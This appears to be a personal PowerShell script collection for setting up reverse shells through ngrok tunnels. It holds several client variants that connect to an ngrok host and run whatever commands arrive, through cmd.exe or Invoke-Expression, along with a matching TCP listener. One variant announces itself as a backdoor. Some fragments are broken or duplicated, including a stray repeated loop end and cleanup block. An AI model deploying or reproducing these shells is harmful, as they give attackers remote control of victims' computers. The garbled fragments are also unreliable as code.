#willperez007
#Setup a reverse shell using ngrok.io

$ngrok_url = 'xxxx.ngrok.io'

$socket = new-object System.Net.Sockets.TcpClient(ngrok_url, 80);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
        $writer.Flush();
        $read = $null;
        $res = ""
        while($stream.DataAvailable -or $read -eq $null) {
                $read = $stream.Read($buffer, 0, 1024)
        }
        $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
        if(!$out.equals("exit")){
                $args = "";
                if($out.IndexOf(' ') -gt -1){
                        $args = $out.substring($out.IndexOf(' ')+1);
                        $out = $out.substring(0,$out.IndexOf(' '));
                        if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
                        }
                        else{
                                $res = (&"$out" "$args") | out-string;
                        }
                }
                else{
                        $res = (&"$out") | out-string;
                }
                if($res -ne $null){
        $writer.WriteLine($res)
    }
        }
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()

$socket = new-object System.Net.Sockets.TcpClient('2672d6a32b10.ngrok.io', 80);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
$socket.close();
$stream.Dispose()


$socket = new-object System.Net.Sockets.TcpListener('3.134.125.175', 80);
if($socket -eq $null){
        exit 1
}
$socket.start()
$client = $socket.AcceptTcpClient()
write-output "[*] Connection!"
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 2048;
$encoding = new-object System.Text.AsciiEncoding;
do
{
    $cmd = read-host
    $writer.WriteLine($cmd)
    $writer.Flush();
    if($cmd -eq "exit"){
        break
    }
                $read = $null;
                while($stream.DataAvailable -or $read -eq $null) {
                        $read = $stream.Read($buffer, 0, 2048)
            $out = $encoding.GetString($buffer, 0, $read)
            Write-Output $out
                }
} While ($client.Connected -eq $true)
$socket.Stop()
$client.close();
$stream.Dispose()

---

$client = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$data = $null;
$result = $null;
try {
        # change the host address and/or port number as necessary
        $client = New-Object Net.Sockets.TcpClient("2672d6a32b10.ngrok.io", 80);
        $stream = $client.GetStream();
        $buffer = New-Object Byte[] 1024;
        $encoding = New-Object Text.AsciiEncoding;
        $writer = New-Object IO.StreamWriter($stream);
        $writer.AutoFlush = $true;
        Write-Host "Backdoor is up and running...";
        $bytes = 0;
        do {
                $writer.Write("PS>");
                do {
                        $bytes = $stream.Read($buffer, 0, $buffer.Length);
                        if ($bytes -gt 0) {
                                $data = $data + $encoding.GetString($buffer, 0, $bytes);
                        }
                } while ($stream.DataAvailable);
                if ($data.Length -gt 0) {
                        try {
                                $result = Invoke-Expression -Command $data 2>&1 | Out-String;
                        } catch {
                                $result = $_.Exception.InnerException.Message;
                        }
                        $writer.WriteLine($result);
                        Clear-Variable -Name "data";
                }
        } while ($bytes -gt 0);
} catch {
        Write-Host $_.Exception.InnerException.Message;
} finally {
        if ($writer -ne $null) {
                $writer.Close();
                $writer.Dispose();
        }
        if ($stream -ne $null) {
                $stream.Close();
                $stream.Dispose();
        }
        if ($client -ne $null) {
                $client.Close();
                $client.Dispose();
        }
        if ($buffer -ne $null) {
                $buffer.Clear();
        }
        if ($data -ne $null) {
                Clear-Variable -Name "data";
        }
        if ($result -ne $null) {
                Clear-Variable -Name "result";
        }
}

} while ($bytes -gt 0); 

} catch { 

Write-Host $_.Exception.InnerException.Message; 

} finally { 

if ($writer -ne $null) { 

$writer.Close(); 

$writer.Dispose(); 

} 

if ($stream -ne $null) { 

$stream.Close(); 

$stream.Dispose(); 

} 

if ($client -ne $null) { 

$client.Close(); 

$client.Dispose(); 

} 

if ($buffer -ne $null) { 

$buffer.Clear(); 

} 

if ($data -ne $null) { 

Clear-Variable -Name "data"; 

} 

if ($result -ne $null) { 

Clear-Variable -Name "result"; 

} 

} 
